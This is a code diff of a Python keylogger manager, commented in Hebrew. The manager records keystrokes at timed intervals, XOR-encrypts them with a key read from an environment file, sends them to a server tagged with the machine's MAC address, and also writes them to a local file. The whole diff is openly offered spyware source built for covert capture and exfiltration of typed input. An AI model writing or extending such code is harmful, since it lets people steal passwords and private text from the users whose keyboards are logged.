@@ -1,47 +1,42 @@
+import os
 from KeyLoggerService import KeyLoggerService
-from network_writer import NetworkWriter
+from Network_send import NetworkSend
 from FileWriter import FileWriterWithTime
+from dotenv import load_dotenv
 from Encryptor import XorEncryptor
 from Get_mac import get_mac_address
 import time
+
+load_dotenv()
 
 
 class KeyLoggerManager:
     """ניהול התוכנה בעזרת קבצי העזר"""
 
-    def __init__(self, timer: int, encryption_key: int | str, url: str, save_to_file: bool = False):
-        """אתחול ניהול מקלדת עם טיימר והצפנה"""
+    def __init__(self,timer: int):
+        """קבלת טיימר לבקשות הנתונים שהוקלדו"""
         self.timer = timer
-        self.encryption_key = encryption_key
-        self.save_to_file = save_to_file
-        self.is_running = False
+        self.running = None
         self.logger = KeyLoggerService()
-        self.encryptor = XorEncryptor()
-        self.network_writer = NetworkWriter(url)
-        self.mac_address = get_mac_address()
-        self.file_writer = FileWriterWithTime() if save_to_file else None  # יצירת אובייקט רק אם צריך
 
     def start(self):
         """מתחיל מעקב והרצת הקבצים הנדרשים"""
-        self.is_running = True
-        self.logger.start_logging()
-        try:
-            while self.is_running:
-                time.sleep(self.timer)
-                logged_keys = self.logger.get_logged_keys()
-                if logged_keys:  # אם היו הקלדות
-                    encrypted_data = self.encryptor.encrypt(logged_keys, self.encryption_key) # הצפנה
-                    self.network_writer.send_data(encrypted_data, self.mac_address) # שליחה לשרת
-                    if self.save_to_file:
-                        self.file_writer.send_data(encrypted_data, 'Key_logger.txt') # כתיבה לקובץ
-        except Exception as e:
-            self.network_writer.send_error(e)
-        finally:
-            self.stop()
+        self.running = True
+        self.logger.start_logging() # תחילת מעקב
+        while self.running:
+            time.sleep(self.timer) # המתנה לפי פרק הזמן המוגדר
+            get_logger = self.logger.get_logged_keys() # קבלת נתונים
+            if get_logger: # אם היו הקלדות
+                print(get_logger)
+                logger_encrypt = XorEncryptor(get_logger, os.getenv('encrypt_key')).encrypt() #
+                NetworkSend(logger_encrypt).send_data(get_mac_address()) # שליחה לשרת
+                FileWriterWithTime(logger_encrypt).send_data('Key logger.txt') # הדפסה לקובץ
 
-    def stop(self):
+    def stop(self,keystrokes):
         """עצירת המעקב"""
-        self.is_running = False
+        self.running = False
         self.logger.stop_logging()
+
+# KeyLoggerManager(6).start()
 
 # הושלם
